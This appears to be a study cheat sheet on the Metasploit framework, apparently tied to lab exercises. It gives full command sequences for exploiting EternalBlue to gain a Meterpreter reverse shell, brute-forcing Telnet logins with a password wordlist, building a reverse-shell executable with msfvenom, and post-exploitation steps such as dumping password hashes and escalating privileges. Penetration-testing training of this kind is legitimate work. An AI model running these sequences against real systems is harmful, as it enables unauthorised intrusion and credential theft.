# Metasploit - Basics

## Introduction
Metasploit is the most powerful penetration testing framework, used for **finding, exploiting, and maintaining access** to vulnerable systems.

---

## Getting Started with Metasploit
### Launching the Metasploit Console
```bash
msfconsole
```
**Starts the Metasploit Framework.**  
- Upon launching, you’ll see the Metasploit banner and stats (e.g., number of exploits, payloads, post modules, etc.).
- The prompt will change to:
  ```
  msf6 >
  ```
- Metasploit supports some **Linux commands** (`ls`, `pwd`) but lacks full shell functionality (`> redirection` isn’t available).

### Key Navigation Commands
| Command | Description |
|---------|------------|
| `help` | Lists all available Metasploit commands. |
| `exit` | Closes Metasploit. |
| `version` | Displays the current Metasploit version. |
| `history` | Shows a list of previously executed commands. |
| `back` | Exits a module and returns to the main console. |

---

## Finding and Selecting Modules
Metasploit modules include **exploits, scanners, payloads, and post-exploitation tools**.

### Searching for Modules
```bash
search ms17-010
```
**Finds modules related to MS17-010 (EternalBlue).**  
- The output includes:
  - **Module number** (e.g., `#2`)
  - **Module path** (e.g., `exploit/windows/smb/ms17_010_eternalblue`)
  - **Reliability rank** (e.g., `excellent` or `manual`)

🔹 **Filter Results by Type or Platform:**
```bash
search type:exploit platform:windows
```
**Lists all Windows-based exploits.**

### Selecting a Module
```bash
use exploit/windows/smb/ms17_010_eternalblue
```
**Loads the EternalBlue exploit.**
- The prompt will change to:
  ```
  msf6 exploit(windows/smb/ms17_010_eternalblue) >
  ```

---

## Configuring Exploit Options
### Viewing Required Parameters
```bash
show options
```
**Lists required and optional parameters.**

| Parameter | Description |
|-----------|-------------|
| `RHOSTS` | Target IP Address (must be set). |
| `RPORT` | Target Port (default: 445 for SMB). |
| `LHOST` | Attacker’s IP Address (used for reverse shells). |
| `LPORT` | Attacker’s Port (default: 4444). |

### Setting Module Parameters
```bash
set RHOSTS 10.10.12.229
set LHOST 10.10.44.70
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
**Configures the target, attacker IP, and payload.**

🔹 **Setting Global Options:**
```bash
setg LHOST 10.10.44.70
```
**Applies `LHOST` across all modules until changed.**

---

## Executing an Exploit
```bash
exploit
```
**Runs the exploit against the target.**
- If successful, opens a **Meterpreter shell:**
  ```
  meterpreter >
  ```
- If unsuccessful, check error messages and reconfigure options (`set`, `check`).

🔹 **Running in Background:**
```bash
exploit -z
```
**Runs the exploit and backgrounds the session immediately.**

🔹 **Checking Target Vulnerability Before Exploiting:**
```bash
check
```
**Tests if the target is vulnerable without launching the attack.**

---

## Real-World Exploitation Examples

### Example 1: Exploiting MS17-010 (EternalBlue) on Windows 7
```bash
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.12.229
set LHOST 10.10.44.70
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```
**Objective:** Gain a Meterpreter shell on a vulnerable Windows 7 machine.

---

### Example 2: Scanning & Exploiting SMB with Database
```bash
systemctl start postgresql
msfdb init
msfconsole
db_nmap -sV -p- 10.10.138.32
services -S microsoft-ds
use auxiliary/scanner/smb/smb_ms17_010
hosts -R
run
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.138.32; set LHOST 10.10.44.70
exploit
```
**Objective:** Scan for SMB vulnerabilities, save to the database, and exploit MS17-010.

---

### Example 3: Port Scanning & Telnet Brute Force
```bash
msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.10; set PORTS 1-100
run
search type:auxiliary telnet
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 10.10.10.10; set RPORT 23
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```
**Objective:** Scan for open Telnet ports and brute-force weak credentials.

---

## Msfvenom - Payload Generation
### Listing Available Payloads
```bash
msfvenom -l payloads
```
**Displays all supported Metasploit payloads.**

### Generating a Reverse Shell Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.44.70 LPORT=4444 -f exe > shell.exe
```
**Creates a Windows executable payload that connects back to the attacker's machine.**

---

## Meterpreter - Post-Exploitation Commands
| Command | Description |
|---------|------------|
| `help` | Lists available Meterpreter commands. |
| `background` | Sends the session to the background. |
| `getuid` | Displays the current user. |
| `sysinfo` | Shows target system details. |
| `hashdump` | Dumps NTLM password hashes. |
| `migrate <PID>` | Moves Meterpreter to another process for stability. |
| `shell` | Opens a command shell on the target system. |
| `getsystem` | Attempts privilege escalation to SYSTEM. |

---

